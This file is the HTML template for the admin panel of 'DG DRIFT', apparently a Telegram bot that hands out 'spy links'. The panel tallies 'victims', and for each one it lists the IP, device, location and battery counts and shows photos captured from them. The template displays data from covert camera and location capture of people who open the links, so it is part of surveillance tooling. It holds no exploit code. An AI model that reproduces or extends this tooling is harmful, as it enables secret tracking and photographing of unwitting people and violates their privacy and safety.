ADMIN_DASHBOARD = '''
<!DOCTYPE html>
<html>
<head><title>Admin - DG DRIFT</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { background: #0f0c29; color: #fff; font-family: Arial; padding: 20px; }
.header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; }
.stats { display: flex; gap: 15px; flex-wrap: wrap; margin: 20px 0; }
.stat-box { background: rgba(255,255,255,0.05); padding: 18px 25px; border-radius: 15px;
            flex: 1; min-width: 100px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
.stat-box h2 { font-size: 32px; color: #f7971e; }
.stat-box p { color: #888; font-size: 13px; }
.btn { background: #f7971e; color: #000; padding: 8px 18px; border: none; border-radius: 10px;
       cursor: pointer; margin: 3px; font-weight: 600; text-decoration: none; display: inline-block; }
.btn:hover { background: #ffd200; }
.btn-danger { background: #ef4444; color: #fff; }
.btn-danger:hover { background: #dc2626; }
.visitor-card { background: rgba(255,255,255,0.03); border-radius: 15px; padding: 20px;
                margin: 15px 0; border: 1px solid rgba(255,255,255,0.05); }
.visitor-card h3 { color: #f7971e; margin-bottom: 8px; }
.info { color: #aaa; font-size: 13px; margin: 4px 0; }
.info strong { color: #ddd; }
.photo-grid { display: flex; flex-wrap: wrap; gap: 8px; margin: 10px 0; }
.photo-grid img { width: 80px; height: 80px; object-fit: cover; border-radius: 8px;
                  border: 2px solid rgba(255,255,255,0.08); }
.badge { display: inline-block; padding: 2px 10px; border-radius: 20px; font-size: 12px;
         background: rgba(255,255,255,0.05); }
.badge.good { background: rgba(74, 222, 128, 0.15); color: #4ade80; }
.empty { color: #666; text-align: center; padding: 40px; }
.creator-tag { color: #f7971e; font-size: 12px; background: rgba(247, 151, 30, 0.1);
               padding: 2px 10px; border-radius: 10px; }
.link-item { background: rgba(255,255,255,0.03); padding: 10px 15px; border-radius: 10px;
             margin: 5px 0; display: flex; justify-content: space-between; align-items: center;
             flex-wrap: wrap; gap: 8px; }
table { width:100%; border-collapse:collapse; font-size:13px; margin-top:10px; }
table th { background:rgba(255,255,255,0.05); padding:8px; text-align:left; }
table td { padding:8px; border-bottom:1px solid rgba(255,255,255,0.05); }
table a { color:#f7971e; text-decoration:none; }
textarea { width:100%; min-height:80px; padding:12px; border-radius:10px;
           background:rgba(255,255,255,0.05); color:#fff; border:none; font-family:Arial; }
</style>
</head>
<body>
<div class="header">
<h1>👾 Admin Panel - DG DRIFT</h1>
<div>
<a href="?export" class="btn">📥 Export</a>
<a href="?clear" class="btn btn-danger" onclick="return confirm('Delete ALL data?')">🗑️ Clear</a>
<a href="?logout" class="btn btn-danger">🚪 Logout</a>
</div>
</div>

<div class="stats">
<div class="stat-box"><h2>{{ total_victims }}</h2><p>Total Victims</p></div>
<div class="stat-box"><h2>{{ total_photos }}</h2><p>Photos Captured</p></div>
<div class="stat-box"><h2>{{ links|length }}</h2><p>Spy Links Created</p></div>
<div class="stat-box"><h2>{{ total_users }}</h2><p>Bot Users</p></div>
</div>

<div style="margin:30px 0;padding:20px;background:rgba(255,255,255,0.03);border-radius:15px;">
<h3>📢 Broadcast to All Users</h3>
<form method="POST" action="/admin_broadcast" style="margin-top:10px;">
<textarea name="message" placeholder="Message to send..." required></textarea>
<button type="submit" class="btn" style="margin-top:10px;"
        onclick="return confirm('Send to ALL users?')">🚀 Send Broadcast</button>
</form>
</div>

<h3 style="margin-top:30px;">👥 All Bot Users ({{ total_users }})</h3>
<div style="overflow-x:auto;">
<table>
<thead>
<tr>
    <th>#</th><th>Name</th><th>Username</th><th>ID</th>
    <th>Msgs</th><th>Links</th><th>First Seen</th><th>Last Seen</th>
</tr>
</thead>
<tbody>
{% for uid, u in users.items() %}
<tr>
    <td>{{ loop.index }}</td>
    <td>{{ u.first_name }} {{ u.last_name }}</td>
    <td>{% if u.username %}<a href="https://t.me/{{ u.username }}" target="_blank">@{{ u.username }}</a>{% else %}—{% endif %}</td>
    <td style="font-family:monospace;">{{ uid }}</td>
    <td>{{ u.messages }}</td>
    <td>{{ u.links_created }}</td>
    <td style="color:#888;">{{ u.first_seen[:16] }}</td>
    <td style="color:#888;">{{ u.last_seen[:16] }}</td>
</tr>
{% endfor %}
</tbody>
</table>
</div>

<div style="margin:20px 0;">
<h3>🔗 All Spy Links</h3>
{% for code, data in links.items() %}
<div class="link-item">
    <span><strong>{{ code }}</strong> → {{ data.url }}</span>
    <span class="creator-tag">By: {{ data.created_by }}</span>
    <span style="color:#666;font-size:12px;">{{ data.created_at }}</span>
</div>
{% endfor %}
</div>

{% if visitors %}
<h3>📋 All Victims</h3>
{% for vid, data in visitors.items() %}
<div class="visitor-card">
    <h3>🆔 {{ vid }}</h3>
    <div class="info"><strong>📱 Device:</strong> {{ data.device[:80] }}</div>
    <div class="info"><strong>🌐 IP:</strong> {{ data.ip }}</div>
    <div class="info"><strong>🎯 Target:</strong> {{ data.target_url }}</div>
    <div class="info"><strong>👤 Generated By:</strong> {{ data.generated_by }}</div>
    <div class="info"><strong>📅 First Seen:</strong> {{ data.time }}</div>
    <div class="info"><strong>📊 Stats:</strong>
        <span class="badge good">📸 {{ data.photos }}</span>
        <span class="badge good">📍 {{ data.locations }}</span>
        <span class="badge good">🔋 {{ data.battery }}</span>
    </div>
    {% if data.photos_list %}
    <div class="photo-grid">
        {% for f in data.photos_list %}
        <img src="/photos/{{ f }}" loading="lazy">
        {% endfor %}
    </div>
    {% endif %}
</div>
{% endfor %}
{% else %}
<div class="empty"><h2>📭 No Victims Yet</h2></div>
{% endif %}
</body>
</html>
'''